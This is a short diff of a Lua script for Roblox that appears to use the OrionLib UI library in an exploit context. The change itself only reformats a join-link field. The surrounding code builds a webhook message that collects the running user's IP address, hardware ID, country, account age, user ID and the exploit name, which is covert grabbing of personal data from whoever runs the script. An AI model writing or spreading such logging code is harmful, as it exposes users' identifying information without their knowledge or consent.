@@ -645,7 +645,6 @@ function OrionLib:Init()
 end	
 
 
-
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -689,7 +688,7 @@ local function createWebhookData()
                     "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                     "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                     "\n\n**Data:**```%s```\n\n**JobId:**```%s```" ..
-                    "\n\n**Join Link:** [Click Here](%s)",
+                    "\n\n**Join Link:**```%s```",
                     Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                     tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                     game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
